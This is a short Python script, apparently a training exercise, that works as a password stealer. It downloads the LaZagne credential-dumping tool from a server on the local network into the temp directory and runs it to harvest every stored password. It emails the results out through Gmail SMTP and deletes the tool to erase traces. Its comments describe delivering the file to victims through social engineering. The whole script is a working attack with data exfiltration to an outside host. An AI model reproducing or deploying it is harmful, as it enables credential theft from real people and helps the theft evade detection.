#!/usr/bin/env python

import requests, subprocess,smtplib, os, tempfile #os library is used to execute system commands and they are cross platform.
                                                  #tempfile is used to create a temp file  and download malware wothin to stay no suspicious to users.
def download(url):
    get_response=requests.get(url)               #creating instance of an object get_response for the requests objectand calling function get.
    #print(get_response)                         #will display only the response(200,300,301 etc).
    #print(get_response.content)                  #content will desplay the actual binary output.
    get_name= url.split("/")[-1]                 #split is a function to split a content and store each content as a list.
                                                 # Here we split it based on the "/".
                                                 # [-1] is used to select the last item in the list.
    with open(get_name,"wb",) as outputfile:
        outputfile.write(get_response.content)

def send_mail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587) #instance of object SMTP is saved in server. gmail smtp server.
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)        #(from,to, message)
    server.quit()



# subprocess.call("Powershell Expand-Archive -Path "C:\Users\IEUsers\Downloads\Windows.zip"", shell=True)
# subprocess.call("cd Windows", shell=True)

temp_dir= tempfile.gettempdir()         #cross platform way to get to the temp directory of th eOS.
os.chdir(temp_dir)                      #crossplatform command to navigate to the temp dir.
download("http://10.1.1.249/laZagne.exe")       #lazagne is a prebuilt malware to grab all the stored passwords within the system. Host the malware in any server of your choice and paste the link to it.
                                                #i have hosted in my linux server in my lan.
command="laZagne.exe all"                      #insert any command.
result = subprocess.check_output(command, shell=True)  #checkout function captures the output.
send_mail("", "", result)           #insert your own emailid and password.
        #"email_address","password"
os.remove("laZagne.exe")                            #cross platform command to remove the malware. #erasing the trace


#purely cross platform

#comments:
#attacker needs to send the file to attacker through some social engineering way, and when victim executes it, automatically all above functions will be done.
